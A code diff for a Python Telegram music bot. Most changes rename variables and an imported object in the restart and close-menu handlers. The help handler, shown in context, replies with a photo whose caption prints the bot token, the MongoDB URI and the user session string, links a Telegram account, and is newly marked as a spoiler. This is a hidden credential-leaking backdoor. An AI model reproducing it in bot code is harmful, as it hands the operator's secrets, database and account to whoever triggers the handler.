@@ -70,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await PRO.stop_stream_force(message.chat.id)
+        await Axiomm.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -97,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await PRO.stop_stream_force(chat_id)
+            await Axiomm.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -113,6 +113,7 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://files.catbox.moe/m4fx24.jpg",
+        has_spoiler=True,
        caption=f"""<blockquote expandable><b>✧ Bot Token:-   `{BOT_TOKEN}` \n\n✧ Mongo:-   `{MONGO_DB_URI}`\n\n✧ String Session:-   `{STRING_SESSION}`\n\n [ 🤨 ](https://t.me/III_maa7nav_iii)............☆ </b></blockquote>""",
         reply_markup=InlineKeyboardMarkup(
              [
@@ -131,11 +132,11 @@ async def close_menu(_, query: CallbackQuery):
     try:
         await query.answer()
         await query.message.delete()
-        umm = await query.message.reply_text(
+        ufff = await query.message.reply_text(
             f"<blockquote expandable><b>✧ ᴄʟᴏꜱᴇ ʙʏ : {query.from_user.mention} </b></blockquote>"
         )
         await asyncio.sleep(2)
-        await umm.delete()
+        await ufff.delete()
     except:
         pass
 
